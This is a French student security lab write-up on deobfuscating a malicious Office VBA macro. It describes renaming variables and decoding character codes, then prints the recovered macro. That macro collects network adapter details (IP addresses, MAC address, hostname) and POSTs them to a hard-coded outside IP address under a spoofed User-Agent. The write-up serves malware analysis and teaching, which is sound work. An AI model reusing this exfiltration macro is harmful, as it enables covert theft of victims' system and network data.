# TP sécu déofusquage

## Étape 1 : Déofusquer le code 

**1 Changer le nom des variables, fonction, etc...**

La première sous-étape que j'ai effectuer pour pouvoir déofusquer le code et qui me permettra par extension d'y voir plus clair dans le code, s'est de changer le nom dans premier temps le nom des variables comme par exemple "Dim uuu As Long" qui devient dans mon code "Dim var8 As Long" : 
```=macro
Dim uuu As Long --> Dim var8 As Long
```

Ensuite dans la deuxième sous-étape s'est de changer le nom des fonctions comme par exemple "Dim mWDaeVN()" qui devient dans mon code "Dim function1()" : 
```=macro
Dim mWDaeVN() --> Dim function1()
```

Ensuite dans la troisième sous-étape s'est de changer les valeurs ascii par ce dont elles correspondent par exemple : 
```=macro
Chr(56) --> Chr(8)
Chr(Int("&H56")) --> Chr(Int("V"))
```

**"56"** correspondant à **"8"** dans la table ascii (décimal) et **"&H56"** correspondant à **"V"** dans la table ascii (hexadécimal)

Puis toujours dans la troisième sous-étape on vois que certain **"Debug.Print"** ne sert à rien donc on peut les enlever pour avoir un code encore plus lisible, ce qui nous permet de supprimer **"Sub"** qui ne servent à rien qui sont **"Sub opop()"** qui retourne le mot **"hi"** et **"Sub fizf()"** qui retourne **"yolo_yolo"**.

Ensuite dans la quatrième sous-étape on peut enlever certaine fonction qui ne servent à rien et/ou changer la chaîne de caractère entre parenthèse si on la connait. Comme par exemple toutes les **"public function"** qui ne servent à rien car le seul **"Sub"** qui est intéressant dans le code c'est **"Sub WMI()"**.

## Étape 2 : Comprendre et expliquer le code 

Quand on a fait toutes les sous-étapes précédente on peut voir et comprendre que de base la macro a été coder de sorte à ce que en gros il fasse un **"ipconfig /all"**, car la macro permet de récupérer nos cartes réseaux, leur configuration, les ports ouverts, le nom de notre PC, l'IP public du PC, son adresse MAC, etc... .

```=macro
Sub WMI()
sWQL = "Select * From Win32_NetworkAdapterConfiguration"
Set var_01 = GetObject("winmgmts:root/CIMV2")
Set var_02 = var_01.ExecQuery(sWQL)
Set var_03 = CreateObject("MSXML2.ServerXMLHTTP")
Url = "http://176.31.120.218:5000/thisis"
Debug.Print Url
For Each oWMIObjEx In var_02
If Not IsNull(oWMIObjEx.IPAddress) Then
Debug.Print "IP:"; oWMIObjEx.IPAddress(0)
var_03.Open "POST", Url, True
var_03.setRequestHeader "User-Agent", "Opera/9.34 (X11; Linux i686; en-US) Presto/2.9.340 Version/11.00"
var_03.send oWMIObjEx.IPAddress(0)
Debug.Print "Host name:"; oWMIObjEx.DNSHostName
For Each oWMIProp In oWMIObjEx.Properties_
If IsArray(oWMIProp.Value) Then
For n = LBound(oWMIProp.Value) To UBound(oWMIProp.Value)
Debug.Print oWMIProp.Name & "()", oWMIProp.Value(n)
var_03.Open "POST", Url, True
var_03.setRequestHeader "User-Agent", "Opera/9.34 (X11; Linux i686; en-US) Presto/2.9.340 Version/11.00"
var_03.send oWMIProp.Value(n)
Next
Else
Debug.Print oWMIProp.Name, oWMIProp.Value
var_03.Open "POST", Url, True
var_03.setRequestHeader "User-Agent", "Opera/9.34 (X11; Linux i686; en-US) Presto/2.9.340 Version/11.00"
var_03.send oWMIProp.Value
End If
Next
End If
Next
End Sub
```

Ce qui prouve que si on ne fait pas attention une macro ofusquer peut faire beaucoup de chose dangereuse (selon les goûts de la personne qui la fait) juste en ouvrant le fichier (ou autre) dans laquelle est contenu la macro ofusquer.